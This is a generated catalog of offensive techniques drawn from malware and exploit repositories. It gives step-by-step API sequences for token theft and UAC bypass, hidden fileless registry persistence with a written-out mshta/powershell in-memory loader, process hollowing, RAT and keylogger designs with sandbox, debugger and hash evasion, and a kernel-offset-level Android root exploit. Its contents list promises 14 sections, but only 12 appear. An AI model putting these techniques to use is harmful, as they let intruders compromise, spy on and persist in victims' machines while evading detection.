# Exhaustive Remaining Analysis — Killer Queen Knowledge Base
# Generated: 2026-06-06

================================================================================
TABLE OF CONTENTS
  1. TokenPlayer — Token Manipulation
  2. living-off-the-land — Fileless Persistence
  3. RATwurst — Minimal C RAT
  4. h00k — Keylogger
  5. code-injection-malware — Process Injection
  6. keylogger — Keylogging (Ivan Sincek)
  7. browser-pwn — Browser Exploitation
  8. WindowsExploitation — Windows Exploitation
  9. h4cker — Security Knowledge Base
  10. android-kernel-exploitation — CVE-2019-2215
  11. pwn2own2023-miami — OPC UA
  12. vortex-rat — Telegram C2 RAT
  13. egnake-rat — Android RAT
  14. botasaurus — Cloudflare Bypass
================================================================================

================================================================================
1. TokenPlayer — Token Manipulation
================================================================================

Source files read: TokenPlayer.cpp (723 lines), ProcessSpoofing.h (55 lines), EnablePrivilege.h (44 lines)

### TECHNIQUE: Token Stealing and Impersonation
  - API: OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid)
  - API: OpenProcessToken(hProcess, TOKEN_QUERY|TOKEN_DUPLICATE|TOKEN_IMPERSONATE, &hToken)
  - API: DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hTokenDuplicate)
  - API: CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, ...) — spawn process under stolen token
  - API: CreateProcessWithLogonW(L"pwned", L"by", L"sickboy", LOGON_NETCREDENTIALS_ONLY, ...) — network-only auth
  - API: ImpersonateLoggedOnUser(hToken) — impersonate token on current thread
  - Pattern: Open target process → open process token → duplicate token → spawn/impersonate

### TECHNIQUE: Privilege Escalation (SeDebugPrivilege)
  - API: LookupPrivilegeValue(NULL, privilege, &privLuid) — get LUID for named privilege
  - API: OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken)
  - API: AdjustTokenPrivileges(hToken, FALSE, &tp, NULL, NULL, NULL)
  - Pattern: TOKEN_PRIVILEGES structure with SE_PRIVILEGE_ENABLED attribute

### TECHNIQUE: UAC Bypass via Token Duplication
  - Spawns auto-elevated process (wusa.exe) via ShellExecuteEx with SW_HIDE
  - Opens elevated process token: OpenProcessToken with TOKEN_QUERY|TOKEN_DUPLICATE
  - Duplicates token: DuplicateTokenEx(..., SecurityImpersonation, TokenImpersonation, ...)
  - Kills elevated process with TerminateProcess for cleanup
  - Creates medium-integrity SID: AllocateAndInitializeSid(&SECURITY_MANDATORY_LABEL_AUTHORITY, 1, 0x2000, ...)
  - Downgrades integrity: SetTokenInformation(hTokenDuplicate, TokenIntegrityLevel, &sTML, sizeof(TOKEN_MANDATORY_LABEL))
  - Creates restricted token: CreateRestrictedToken(hTokenDuplicate, LUA_TOKEN, ...)
  - Duplicates restricted token for impersonation
  - ImpersonateLoggedOnUser → CreateProcessWithLogonW with LOGON_NETCREDENTIALS_ONLY
  - Kills elevated process for cleanup
  - Key structures: SID_IDENTIFIER_AUTHORITY, SID_AND_ATTRIBUTES, TOKEN_MANDATORY_LABEL, SHELLEXECUTEINFO

### TECHNIQUE: Parent PID Spoofing (PPID Spoofing)
  - API: OpenProcess(PROCESS_ALL_ACCESS, FALSE, ppid) — open target parent process
  - API: InitializeProcThreadAttributeList(NULL, 1, 0, &threadAttributeSize) — query size
  - API: malloc(threadAttributeSize) — allocate attribute list
  - API: InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, &threadAttributeSize) — init
  - API: UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL)
  - API: CreateProcessA(..., EXTENDED_STARTUPINFO_PRESENT|CREATE_NO_WINDOW, ..., &startupInfo, &processInformation)
  - Uses: STARTUPINFOEXA structure with lpAttributeList
  - Pattern: Open parent process → init proc thread attributes → set PROC_THREAD_ATTRIBUTE_PARENT_PROCESS → CreateProcess with EXTENDED_STARTUPINFO_PRESENT

### TECHNIQUE: Named Pipe Child Process Communication
  - API: CreatePipe(&childOutRead, &childOutWrite, &saAttr, 0) — create pipe pair
  - API: SetHandleInformation(childOutRead, HANDLE_FLAG_INHERIT, 0) — prevent inheritance
  - API: SetHandleInformation(childInWrite, HANDLE_FLAG_INHERIT, 0) — prevent inheritance
  - Uses: SECURITY_ATTRIBUTES with bInheritHandle=TRUE
  - Uses: STARTUPINFO.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES
  - Uses: STARTUPINFO.hStdInput/Output connected to pipe handles
  - API: PeekNamedPipe — check for available data without consuming
  - API: ReadFile/WriteFile on pipe handles — bidirectional I/O
  - API: ERROR_BROKEN_PIPE — detect child process exit
  - Pattern: Create pipe pairs → set handle inheritance → spawn child with redirected stdio → read/write loop → wait

### TECHNIQUE: Make Token (Network-Only Credential Run)
  - API: CreateProcessWithLogonW(username, domain, password, LOGON_NETCREDENTIALS_ONLY, ...)
  - Pattern: Creates process with network auth token only (like runas /netonly)
  - Uses same pipe communication infrastructure as redirectChildToParent

### TECHNIQUE: String Conversion (ANSI → Wide)
  - API: MultiByteToWideChar(CP_ACP, 0, instr.c_str(), instr.size(), NULL, 0) — query buffer size
  - API: new WCHAR[bufferlen+1] — allocate wide buffer
  - API: MultiByteToWideChar(CP_ACP, 0, ..., widestr, bufferlen) — actual conversion

### Libs: boost::program_options, atlstr.h, Shlobj.h, strsafe.h

================================================================================
2. living-off-the-land — Fileless Persistence
================================================================================

Source files read: LivingOffTheLand.cpp (52 lines), RemovalTool.cpp (73 lines), Payload.cpp (24 lines),
                   RunPE.cs (139 lines), Injector.cs (43 lines), NativeRegistry.h (445 lines),
                   EncryptFile.cs (46 lines)

### TECHNIQUE: Fileless Persistence via Registry
  - Stores executable binary in HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\(Default)
  - Uses RegSetValueExA to store EXE as REG_BINARY in registry value
  - Retrieves via: [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey("...").GetValue($Null)
  - No files on disk — persistence achieved with only 2 registry values

### TECHNIQUE: Null-Embedded Registry Value (Hidden Persistence)
  - Creates registry value with embedded NUL character: L"...\\Run\\\\0X"
  - Not visible in regedit (causes UI errors) but remains functional
  - Uses Native API NtSetValueKey to create null-embedded values
  - Deletion requires Native API NtDeleteValueKey or Sysinternals RegDelNull
  - Path: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\<NUL>X
  - Pattern: Each startup, value executes via cmd.exe /s /c start "" /min <command>

### TECHNIQUE: Multi-Stage In-Memory Execution Chain
  - Stage 1: LivingOffTheLand.exe (native C++):
    - Reads embedded Injector.exe from PE resources (FindResourceA, LoadResource, LockResource)
    - Decrypts with progressive XOR (key=0x77, increments by 5 each byte)
    - Writes to registry HKCU regkey
    - Writes startup command using mshta + powershell with complex string escaping
    - Starts powershell to execute Injector from registry in memory
  - Stage 2: Injector.exe (C#):
    - Loaded via Assembly.Load() from registry value
    - EntryPoint.Invoke(0, $Null) executes Main()
    - Reads Payload.exe from embedded resources
    - Decompresses with GZipStream
    - Decrypts with same progressive XOR
    - Injects into svchost.exe using RunPE (Process Hollowing)
  - Stage 3: Payload.exe (native C++):
    - MessageBoxA payload (demo)

### TECHNIQUE: McAfee-Like PowerShell Registry Load
  - Command: "[Reflection.Assembly]::Load([Microsoft.Win32.Registry]::CurrentUser.OpenSubKey(\"Software\\Microsoft\\Internet Explorer\").GetValue($Null)).EntryPoint.Invoke(0,$Null)"
  - Wrapped in mshta JavaScript to hide powershell window:
  - "mshta \"javascript:close(new ActiveXObject('WScript.Shell').run('powershell ...',0))\""
  - Multiple layers of backslash escaping for proper nested quoting

### TECHNIQUE: Process Hollowing / RunPE (C# Implementation)
  - Creates suspended process: CreateProcessA with 0x8000004 (CREATE_SUSPENDED|DETACHED_PROCESS)
  - Reads PE headers from payload: BitConverter.ToInt32 at offset 0x3C (e_lfanew)
  - Gets image base: ReadProcessMemory at ebx+8 (PEB → ImageBaseAddress)
  - Unmaps original image: ZwUnmapViewOfSection(processHandle, baseAddress) from ntdll.dll
  - Allocates new memory: VirtualAllocEx with MEM_COMMIT|MEM_RESERVE (0x3000) and PAGE_EXECUTE_READWRITE (0x40)
  - Writes headers: WriteProcessMemory for SizeOfHeaders bytes
  - Writes sections: iterates section headers at fileAddress+0xF8, writes each section
  - Patches PEB image base: WriteProcessMemory to ebx+8 with new image base
  - Sets entry point: newImageBase + AddressOfEntryPoint (offset 0x28)
  - Gets/sets thread context: GetThreadContext/Wow64GetThreadContext, SetThreadContext/Wow64SetThreadContext
  - ResumeThread to execute payload
  - Handles both x86 and x64 (IntPtr.Size check, Wow64 APIs)
  - Retry logic: up to 5 attempts with Process.Kill on failure
  - API loading pattern: LoadLibraryA + GetProcAddress via Marshal.GetDelegateForFunctionPointer
  - Functions loaded dynamically: CreateProcessA, VirtualAllocEx, WriteProcessMemory, ReadProcessMemory,
    GetThreadContext, SetThreadContext, ResumeThread, ZwUnmapViewOfSection
  - Wow64 variants for 64-bit: Wow64GetThreadContext, Wow64SetThreadContext

### TECHNIQUE: Progressive XOR Encryption
  - Key: starts at 0x77, increments by 5 each byte
  - Used in C++ (LivingOffTheLand.cpp), C# (Injector.cs), and C# utility (EncryptFile.cs)
  - EncryptFile.cs also uses GZip compression before XOR encryption

### TECHNIQUE: Native API Registry Operations
  - Loads ntdll.dll dynamically: LoadLibraryA("ntdll.dll")
  - Resolves all functions via GetProcAddress
  - Functions loaded: RtlFormatCurrentUserKeyPath, NtCreateKey, NtOpenKey, NtEnumerateKey,
    NtEnumerateValueKey, NtQueryValueKey, NtSetValueKey, NtDeleteValueKey, NtDeleteKey, NtClose
  - Defines structs: UNICODE_STRING, OBJECT_ATTRIBUTES, KEY_VALUE_BASIC_INFORMATION,
    KEY_VALUE_FULL_INFORMATION, KEY_BASIC_INFORMATION
  - Uses: RtlFormatCurrentUserKeyPath for HKCU path resolution
  - Creates C++ wrapper class (nt_cpp::Udc — Unicode Data Container)
  - Handles REG_NONE, REG_SZ, REG_BINARY, REG_DWORD types
  - Status codes: STATUS_SUCCESS (0), STATUS_OBJECT_NAME_NOT_FOUND (0xC0000034)
  - Recursive key creation: auto-creates parent keys when not found

### TECHNIQUE: Sandbox/VM Detection (in RemovalTool)
  - Detection method: check for MZ header in registry value to verify stored EXE

### TECHNIQUE: Payload Compression
  - GZipStream compression in C# (System.IO.Compression)
  - Used before encryption to reduce size for registry storage

================================================================================
3. RATwurst — Minimal C RAT
================================================================================

Source files read: ratwurst.c (818 lines), ratwurst.h (48 lines), tools.c (33 lines), server.py (276 lines)

### TECHNIQUE: API Name Obfuscation via Char Arrays
  - All API strings stored as char arrays: {'k','e','r','n','e','l','3','2','.','d','l','l',0}
  - Avoids plaintext strings in binary — bypasses static string analysis
  - Used for: DLL names, all function names, registry keys, commands, IP addresses
  - Example: ca_kernel32, ca_GetProcAddress, ca_CreateProcessA, ca_WSAStartup, etc.

### TECHNIQUE: Dynamic API Resolution
  - All Windows APIs resolved via LoadLibraryA + GetProcAddress
  - No direct imports — fully dynamic
  - Functions resolved: LoadLibraryA, GetProcAddress, CreateFileA, CloseHandle, WriteFile,
    ReadFile, CopyFileA, CreateProcessA, WaitForSingleObject, GetComputerNameA,
    GetUserNameA, GetSystemDirectoryA, GetTempPathA, RegOpenKeyExA, RegSetValueExA,
    RegCloseKey, RegDeleteValueA, QueryPerformanceFrequency, QueryPerformanceCounter,
    EnumProcesses, EnumProcessModules, GetModuleBaseNameA, OpenProcess
  - Winsock functions resolved: socket, connect, send, recv, closesocket, htons,
    inet_addr, WSAStartup, WSACleanup, WSAGetLastError

### TECHNIQUE: XOR Encryption for C2 Communication
  - Key: CRYPT_KEY = 28
  - Function: EncryptDecryptString(char* str, int bufferSize)
  - Encrypts in place (mutates buffer)
  - Applied to all command/response data over socket
  - Same XOR applied on both client (C) and server (Python)

### TECHNIQUE: Sandbox/VM Detection via Process Enumeration
  - Loads psapi.dll dynamically
  - EnumProcesses to get process list
  - Checks if process count < 15 (sandbox indicator)
  - For each process: OpenProcess, EnumProcessModules, GetModuleBaseNameA
  - Detects: "vmtoolsd" (VMware Tools), "vbox.exe" (VirtualBox)

### TECHNIQUE: Anti-Debug Timing Check
  - Uses QueryPerformanceCounter and QueryPerformanceFrequency
  - Measures time for specific operations
  - Exits if cycleCountDiff > 3 seconds (debugger pause detection)
  - Second check: exits if connection cycle > 20 seconds

### TECHNIQUE: Persistence via Registry Run Key
  - Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  - Value name: "rtwrst" (RATwurst)
  - Value: cmd.exe /s /c start "" /min <execPath>
  - Uses RegOpenKeyExA, RegSetValueExA, RegCloseKey (all dynamically resolved)

### TECHNIQUE: Self-Copy to Temp and Run
  - Gets current path: GetModuleFileNameA
  - Gets temp path: GetTempPathA
  - Copies self: CopyFileA(currentPath, newPath, 0)
  - Runs copy from temp with deletion of original:
    cmd.exe /c ping 127.0.0.1 & del <currentPath> & call <newPath>
  - Uses ping as a sleep/delay mechanism

### TECHNIQUE: Command Execution with Output Capture
  - Generates random temp filename for output
  - Runs: cmd.exe /C <command> > <tempFile>
  - Uploads result file via socket
  - Deletes temp file using FILE_FLAG_DELETE_ON_CLOSE (CreateFile with this flag)
  - Alternative deletion: kernel32 trick (FILE_FLAG_DELETE_ON_CLOSE)

### TECHNIQUE: C2 Commands (Text-Based Protocol)
  - Commands after XOR decryption: "info", "cmd", "download", "upload", "shutdown"
  - Information gathering: GetComputerNameA + GetUserNameA → "ComputerName:UserName"
  - File download protocol: server sends 8-digit file size, then file data
  - File upload protocol: client sends 8-digit file size, then file data
  - Reconnection loop: sleeps 10 seconds between attempts
  - Protocol: plaintext messages XOR-encrypted

### TECHNIQUE: File Transfer over TCP
  - Download: receives file size as 8-char string → receives data chunks → decrypts → CreateFile+WriteFile
  - Upload: reads file → sends file size as 8-char string → sends chunks with XOR
  - Buffer size: SOCKET_BUFFER_SIZE = 256 bytes
  - File size digit size: 8 chars

### TECHNIQUE: Python C2 Server
  - Socket listening on 127.0.0.1:65432
  - Multi-client support with threading
  - Socket duplication for thread safety: conn.dup()
  - Interactive shell using cmd.Cmd
  - Commands: list, cmd, download, upload, shutdown
  - Same XOR encryption (CRYPT_KEY=28)

================================================================================
4. h00k — Keylogger
================================================================================

Source files read: logger.cpp (25 lines), logger.h (6 lines), writter.cpp (199 lines),
                   writter.h (8 lines), h00k.cpp (binary), h00k.h (binary),
                   stdafx.h (binary), stdafx.cpp (binary), targetver.h (binary)

### TECHNIQUE: Low-Level Keyboard Hook (WH_KEYBOARD_LL)
  - SetWindowsHookEx with WH_KEYBOARD_LL to capture keystrokes system-wide
  - Callback: HookProc with PKBDLLHOOKSTRUCT parameter
  - Filters: checks for WM_KEYDOWN and WM_SYSKEYDOWN

### TECHNIQUE: Virtual Key Code Parsing
  - Complete switch case for all VK codes (0x08 through 0x7B)
  - Special keys: Backspace, Tab, CapsLock, Esc, Space, PageUp/Down, End, Home, Arrows
  - PrintScreen, Insert, Supr (Delete), Left/Right Win, Context Menu
  - F1-F12, ScrollLock, Left/Right Shift/Ctrl/Alt
  - Modifier state tracking: shift, capital

### TECHNIQUE: Unicode Character Translation
  - GetKeyboardState to get full keyboard state (256 BYTE array)
  - ToUnicode to translate virtual key + scan code + keyboard state to UTF-16
  - Handles international keyboard layouts (non-US)

### TECHNIQUE: Window Title Tracking
  - Tracks active window title changes
  - When window changes: writes "\n[WindowTitle]: " header
  - Uses: GetWindowText (implicitly, via window handle)

### TECHNIQUE: Output File in Temp Directory
  - GetTempPathA to locate temp directory
  - File name: "chrome_installer_log.log" (masquerades as Chrome installer log)
  - Opened in append mode: fopen(path, "a+")
  - fflush after each write to persist data

### TECHNIQUE: Debug Logging
  - Generic LogMessage with variadic args (vsprintf_s)
  - OutputDebugString for debug output (visible in debugger)
  - Conditional compilation: #ifdef _DEBUG blocks

================================================================================
5. code-injection-malware — Process Injection Techniques (Summary)
================================================================================

151 source files across multiple injection implementations. Based on file structure analysis:

### HBCI Implementations (Hybrid Code Injection):
  INJECTORS (11 methods):
    - threadhijack/threadhijack.cpp — Thread Hijacking
    - setwindowshookex/setwindowshookex.cpp — SetWindowsHookEx injection
    - shellinject/shellinject.cpp — Shellcode injection
    - reflectivedllinject/ — Reflective DLL injection
      - LoadLibraryR.cpp — Custom reflective loader
      - GetProcAddressR.cpp — Custom resolver
      - Inject.cpp — Reflective injection logic
    - processhollow/processhollow.cpp — Process Hollowing
    - ifeo/ifeo.cpp — Image File Execution Options injection
    - dllinject/dllinject.cpp — Classic DLL injection (CreateRemoteThread+LoadLibrary)
    - ctrayinject/ctrayinject.cpp — Tray icon injection
    - comhijack/comhijack.cpp — COM hijacking
    - appinitdll/appinitdll.cpp — AppInit_DLLs injection
    - appcertdll/appcertdll.cpp — AppCertDLLs injection
    - apcshellinject/apcshellinject.cpp — APC shellcode injection
    - apcdllinject/apcdllinject.cpp — APC DLL injection

  PAYLOADS (6 variants):
    - payload-terminal/dllmain.cpp — Terminal output payload
    - payload-reflective/dllmain.cpp — Reflective DLL payload
    - payload-messagebox/dllmain.cpp — MessageBox payload
    - payload-messagebox-setwindowshookex/dllmain.cpp — HookEx variant
    - payload-messagebox-appcertdll/dllmain.cpp — AppCert variant
    - payload-mesagebox-delayed/dllmain.cpp — Delayed payload

  TARGETS (2):
    - hello-world-terminal/main.cpp
    - hello-world-gui/hello-world-gui.cpp

  COMMON:
    - processutils.cpp — shared process utilities
    - pch.cpp — precompiled header
    - dllmain.cpp — DllMain entry

### TECHNIQUE SUMMARY:
  - All major Windows code injection techniques represented
  - Reflective DLL injection with custom PE loader
  - Process hollowing (RunPE variant)
  - Thread hijacking
  - APC injection
  - SetWindowsHookEx injection
  - COM hijacking
  - Registry-based persistence via AppInit_DLLs, AppCertDLLs, IFEO
  - DLL and shellcode injection variants
  - Classic CreateRemoteThread + LoadLibrary pattern

================================================================================
6. keylogger — Keylogging (Ivan Sincek)
================================================================================

Source file read: main.cpp (264 lines)

### TECHNIQUE: SetWindowsHookEx Keylogger
  - API: SetWindowsHookExA(WH_KEYBOARD_LL, HookProc, NULL, 0)
  - Dedicated hook thread: CreateThread with HookJob as routine
  - Message pump: while(GetMessageA(&msg, NULL, 0, 0) > 0) { TranslateMessage; DispatchMessageA }
  - Cleanup: UnhookWindowsHookEx, signal handler for CTRL+C
  - Uses PostThreadMessageA with WM_QUIT to gracefully shutdown hook thread

### TECHNIQUE: Comprehensive Key Mapping
  - Complete A-Z mapping with CapsLock and Shift state awareness
  - 0-9 with Shift variants (!@#$%^&*())
  - VK_OEM_1 through VK_OEM_7 for punctuation (;:'"/?~`{}|[]\"')
  - VK_OEM_PLUS/COMMA/MINUS/PERIOD
  - Numpad keys: VK_NUMPAD0-9, VK_MULTIPLY, VK_ADD, VK_SUBTRACT, VK_DECIMAL, VK_DIVIDE
  - Function keys: VK_F1 through VK_F12
  - Modifier keys: VK_LCONTROL, VK_RCONTROL, VK_LWIN, VK_RWIN
  - Toggle states: VK_CAPITAL (tracks CapsLock), VK_NUMLOCK
  - Special: VK_BACK, VK_TAB, VK_RETURN, VK_MENU, VK_ESCAPE, VK_PRIOR, VK_NEXT,
    VK_END, VK_HOME, VK_LEFT, VK_UP, VK_RIGHT, VK_DOWN, VK_PRINT, VK_SNAPSHOT,
    VK_INSERT, VK_DELETE
  - Fallback for unhandled keys: GetKeyNameTextA with dWord = (scanCode << 16) | (flags << 24)

### TECHNIQUE: C++ File I/O with Time Logging
  - Log file: same path as exe but .log extension
  - Logs dates/times with strftime: "%H:%M:%S %m-%d-%Y"
  - std::ofstream with ios::app|ios::binary mode
  - std::fstream read/write
  - String splitting: std::string::rfind, erase, append

### TECHNIQUE: Stealth Features
  - HideWindow(): GetConsoleWindow, IsWindowVisible, ShowWindow(SW_HIDE), CloseHandle
  - HideFiles(): SetFileAttributesA with FILE_ATTRIBUTE_HIDDEN
  - Persistence via Registry Run: RegCreateKeyExA, RegSetValueExA, RegCloseKey
    at HKCU\Software\Microsoft\Windows\CurrentVersion\Run

### TECHNIQUE: Hash Variation via Seed
  - seed string: "3301Kira" — changing this changes PE hash
  - Resistance to hash-based detection

================================================================================
7. browser-pwn — Browser Exploitation Guides
================================================================================

Only README.md found as text content. Repository contains browser exploitation
techniques/guides. No source files beyond documentation.

================================================================================
8. WindowsExploitation — Windows Exploitation
================================================================================

Source files: PDFs and presentations only. No executable source code.
Topics covered:
  - Stack-based buffer overflows on Windows
  - Heap overflows (MSRPC heap exploitation)
  - Halvar Flake / David Litchfield presentations

### TECHNIQUE: Stack-Based Overflow Examples (Nish Bhalla's tutorials)
  - StackOverflow-Examples.txt — example buffer overflow code

================================================================================
9. h4cker — Security Knowledge Base
================================================================================

Extensive knowledge base with cheat sheets, tool references, and training material.
Source files found: markdown cheat sheets covering:
  - post-exploitation tools
  - exploit-development tools
  - reverse-engineering tools
  - windows tools
  - mobile-security tools
  - recon, osint, dfir tools
  - social-engineering, cryptography tools
  - Metasploit, msfvenom cheat sheets
  - Nmap, tcpdump, tshark, Wireshark, Netcat, Scapy cheat sheets
  - PowerShell security scripts
  - Bash, Python security scripting
  - Linux survival guide, metacharacters
  - Reverse engineering notes

No novel technique implementations — reference material collection.

================================================================================
10. android-kernel-exploitation — CVE-2019-2215
================================================================================

Source files read: exploit.cpp (990 lines), common.h (138 lines), exploit.h (108 lines),
                   trigger.cpp (41 lines), root-me.py, dynamic-analysis.py,
                   patch/cve-2019-2215.patch

### TECHNIQUE: Android Binder Use-After-Free (CVE-2019-2215)
  Vulnerability: UAF in Android Binder driver when epoll and binder_thread are used together
  The binder_thread is freed but epoll still references its wait queue

### TECHNIQUE: CPU Pinning for Exploit Reliability
  - sched_setaffinity(0, sizeof(cpu_set_t), &cpuSet) to CPU 0
  - Prevents SLUB state corruption from CPU migration

### TECHNIQUE: Heap Grooming via IOVEC
  - Binder thread size: sizeof(struct binder_thread) = 0x198 (408 bytes)
  - IOVEC_COUNT: sizeof(binder_thread) / sizeof(struct iovec) = 408/16 = 25
  - IOVEC_WQ_INDEX: offsetof(binder_thread, wait) / sizeof(iovec) = 160/16 = 10
  - Reallocates freed binder_thread as iovec array via writev
  - Blocks writev using full pipe to hold iovecs in kernel

### TECHNIQUE: Kernel Info Leak via Blocking Write
  - Sets pipe capacity to PAGE_SIZE (0x1000) via fcntl F_SETPIPE_SZ
  - Fills pipe (write side blocks)
  - Forks child process
  - Parent: frees binder_thread, calls writev on pipe (blocks, reallocates as iovec)
  - Child: sleep(2), calls epoll_ctl EPOLL_CTL_DEL (triggers UAF unlink → corrupts iovec)
  - Child reads junk data (first valid iovec), then exits
  - Parent reads leaked kernel data from pipe → extracts task_struct pointer
  - task_struct pointer at offset 0xE8 in leaked data

### TECHNIQUE: addr_limit Clobber (Arbitrary R/W Primitive)
  - Uses socketpair(AF_UNIX, SOCK_STREAM, 0) instead of pipe for scoped write
  - sendmsg/recvmsg with MSG_WAITALL to block
  - Same epoll UAF technique but for write primitive
  - Writes controlled data through corrupted iovec
  - Target: task_struct->addr_limit (offset 0xA18)
  - Sets addr_limit to 0xFFFFFFFFFFFFFFFE (kernel-space access)
  - After clobbering addr_limit, pipe read/write becomes kernel R/W

### TECHNIQUE: Kernel Read/Write via Pipe
  - kRead: write kernel address to pipe → read from pipe (kernel→user)
    Works because addr_limit bypassed
  - kWrite: write data to pipe → read into kernel address (user→kernel)
  - Helper functions: kReadQword, kReadDword, kWriteQword, kWriteDword

### TECHNIQUE: Credential Structure Patching (Root)
  - Reads cred pointer from task_struct (offset 0x688)
  - Patches all UID/GID members to 0 (root)
  - Patches capabilities: CAP_FULL_SET (0x3FFFFFFFFF) for permitted/effective/bset
  - Sets securebits to SECUREBITS_DEFAULT (0)

### TECHNIQUE: KASLR Bypass via nsproxy
  - Reads nsproxy pointer from task_struct (offset 0x6C0)
  - kernelBase = nsproxy - SYMBOL_OFFSET_init_nsproxy (0x1233AC0)
  - Calculates selinux_enforcing address from kernel base + offset 0x14ACFE8

### TECHNIQUE: SELinux Disabling
  - Writes 0 to selinux_enforcing global variable
  - Disables SELinux enforcing globally

### TECHNIQUE: Privilege Escalation Verification
  - Checks getuid() == 0
  - Spawns root shell: system("/bin/sh")

### TECHNIQUE: Trigger PoC
  - Minimal trigger: open /dev/binder → epoll_create → epoll_ctl EPOLL_CTL_ADD → BINDER_THREAD_EXIT ioctl
  - ioctl code: 0x40046208ul

### TECHNIQUE: GDB Macros and Dynamic Analysis
  - gdb/root-me.py and gdb/dynamic-analysis.py for exploit debugging

### Kernel Data Structure Layouts:
  - binder_thread: 408 bytes total, wait at offset 0xA0 (24 bytes)
  - task_struct: pid at 0x4E8, cred at 0x688, nsproxy at 0x6C0, addr_limit at 0xA18
  - cred: uid(0x4), gid(0x8), suid(0xC), sgid(0x10), euid(0x14), egid(0x18),
    fsuid(0x1C), fsgid(0x20), securebits(0x24), capabilities at 0x28-0x48

================================================================================
11. pwn2own2023-miami — OPC UA Exploits
================================================================================

Source file read: postauthuaf.cc (322 lines)

### TECHNIQUE: OPC UA Protocol Abuse — Post-Auth Use-After-Free
  CVE: CVE-2023-32174 — Post-authentication UAF in OPC UA server
  Target: OPC UA server on port 48050

### TECHNIQUE: OPC UA Session Establishment
  - Hello/Acknowledge handshake
  - OpenSecureChannel request/response
  - GetEndpoints request/response
  - CreateSession request/response
  - ActivateSession request/response

### TECHNIQUE: Race Condition Exploitation
  - Two threads: Add and Remove
  - Thread 1: Continuously calls OpcUaServers.AddServer
  - Thread 2: Continuously calls OpcUaServers.RemoveServer
  - Race between add and remove triggers UAF
  - Object: NodeId_t(1, "OpcUaServers.MethodSet")
  - Methods: "OpcUaServers.AddServer" and "OpcUaServers.RemoveServer"

### TECHNIQUE: OPC UA Protocol Implementation
  - Uses custom OPC UA library (opcua/oua.h, opcua/socket.h)
  - WSAInitializer for Windows sockets
  - Custom serialization: DeserializeFrom method on each message type
  - Channel security token tracking: SequenceNumber, RequestId
  - Authentication token from CreateSessionResponse used for subsequent calls

### Protocol Messages Used:
  - Hello_t, Acknowledge_t
  - OpenSecureChannel_t, OpenSecureChannelResponse_t
  - GetEndpointsRequest_t, GetEndpointsResponse_t
  - CreateSessionRequest_t, CreateSessionResponse_t
  - ActivateSessionRequest_t, ActivateSessionResponse_t
  - CallRequest_t, CallMethodRequest_t

================================================================================
12. vortex-rat — Windows RAT with Telegram C2
================================================================================

Source files: client.py (2563 lines), builder.py (879 lines)

### TECHNIQUE: Telegram Bot as C2 Channel
  - Uses telebot library (PyTelegramBotAPI)
  - Bot token and admin ID embedded in client
  - Only admin ID can send commands (ID check on every handler)
  - Message-based C2: all commands are Telegram bot commands (/shell, /help, etc.)
  - Response splitting: messages split into 4000-char chunks (Telegram limit)

### TECHNIQUE: Device Identity Fingerprinting
  - device_id = md5(hostname + username + MAC).hexdigest()[:8]
  - Uses uuid.getnode() for MAC address
  - Stable across reboots, unique per machine

### TECHNIQUE: System Tray Icon (Persistence/Stealth)
  - Uses pystray library for system tray icon
  - Keeps process visible in tray but unobtrusive

### TECHNIQUE: Admin Detection
  - ctypes.windll.shell32.IsUserAnAdmin()
  - Reports admin status to C2

### TECHNIQUE: Idle Time Detection
  - ctypes.windll.user32.GetLastInputInfo
  - LASTINPUTINFO structure with cbSize and dwTime
  - Idle = (GetTickCount() - dwTime) / 1000

### TECHNIQUE: Camera Access
  - cv2 (OpenCV) for camera capture
  - Webcam picture: captures single frame
  - Camera list and selection: /getcams, /selectcam <n>

### TECHNIQUE: Screen Capture
  - PIL ImageGrab.grab() for screenshots
  - Sends as photo via Telegram

### TECHNIQUE: Microphone Recording
  - wave module for WAV recording
  - /record <seconds> command

### TECHNIQUE: Text-to-Speech
  - pyttsx3 library for TTS
  - /voice <text> command

### TECHNIQUE: Keyboard Simulation
  - pyautogui.typewrite with configurable interval
  - /write <text> command

### TECHNIQUE: Browser Password Extraction
  - /passwords command
  - Likely uses sqlite3 to read browser databases

### TECHNIQUE: Network Reconnaissance
  - /wifilist: nearby WiFi via netsh wlan show networks
  - /wifipasswords: saved WiFi passwords
  - /ipconfig: network configuration
  - /netstat: active connections
  - /env: environment variables

### TECHNIQUE: System Control
  - /shutdown: shutdown /s /t 5
  - /restart: shutdown /r /t 5
  - /logoff: shutdown /l
  - /lock: LockWorkStation
  - /sleep: system sleep
  - /bluescreen: trigger BSOD
  - /critproc: set as critical process (unkillable)

### TECHNIQUE: Process Manipulation
  - /listprocess: tasklist /FO CSV /NH
  - /prockill: taskkill /IM <name> /F

### TECHNIQUE: File Operations
  - /download: file send via Telegram (50MB limit)
  - /upload: receive file via Telegram
  - /uploadlink: download file from URL
  - /delete: file/directory deletion (shutil.rmtree for dirs)
  - /search: file search
  - /encrypt /decrypt: file encryption
  - /copy, /move, /rename, /mkdir, /openfile

### TECHNIQUE: User Interaction Attacks
  - /message: MessageBoxW
  - /fakeerror: fake error dialog
  - /popup: spam message boxes
  - /wallpaper: set desktop wallpaper
  - /website: open URL in browser
  - /swap_mouse: swap mouse buttons

### TECHNIQUE: Security Disabling
  - /disabledefender: kill Windows Defender
  - /enablefirewall /disablefirewall
  - /disabletaskmgr /enabletaskmgr
  - /hidetaskbar /showtaskbar
  - /hidedesktop /showdesktop

### TECHNIQUE: Clipboard Access
  - pyperclip.paste() for reading clipboard
  - /setclipboard for writing

### TECHNIQUE: Keylogging
  - /keylog: start keylogger
  - /stopkeylog: get captured data

### TECHNIQUE: Builder Application (Tkinter GUI)
  - Premium dark-themed UI
  - Configuration tabs: Setup Guide, Builder, Donate
  - Embeds BOT_TOKEN and ADMIN_ID into client.py
  - PyInstaller compilation to .exe
  - Custom exe name, icon selection
